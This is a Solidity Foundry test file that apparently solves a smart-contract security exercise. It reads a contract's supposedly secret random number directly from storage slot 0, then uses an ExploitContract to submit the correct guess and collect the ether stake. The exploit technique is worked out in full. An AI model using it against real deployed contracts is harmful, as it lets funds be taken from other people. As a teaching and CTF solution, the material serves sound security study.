// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GuessRandomNumber.sol";

contract GuessRandomNumberTest is Test {
    GuessRandomNumber public guessRandomNumber;
    ExploitContract public exploitContract;

    function setUp() public {}

    function testAnswer(uint256 blockNumber, uint256 blockTimestamp) public {
        // Prevent zero inputs
        vm.assume(blockNumber != 0);
        vm.assume(blockTimestamp != 0);
        // Set block number and timestamp
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Place your solution here
        guessRandomNumber = (new GuessRandomNumber){value: 1 ether}();
        exploitContract = new ExploitContract();
        // Load variable from storage slot 0
        bytes32 variable = vm.load(address(guessRandomNumber), 0);
        //console.log("variable:", variable);
        uint256 variableInt = uint256(variable);
        console.log("variableInt:", variableInt);
        uint8 _answer = uint8(variableInt);
        console.log("_answer:", _answer);
        exploitContract.setAnswer(_answer);
        uint8 guess = exploitContract.Exploit();
        guessRandomNumber.guess{value: 1 ether}(guess);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(guessRandomNumber.isComplete(), "Wrong Number");
    }

    receive() external payable {}
}
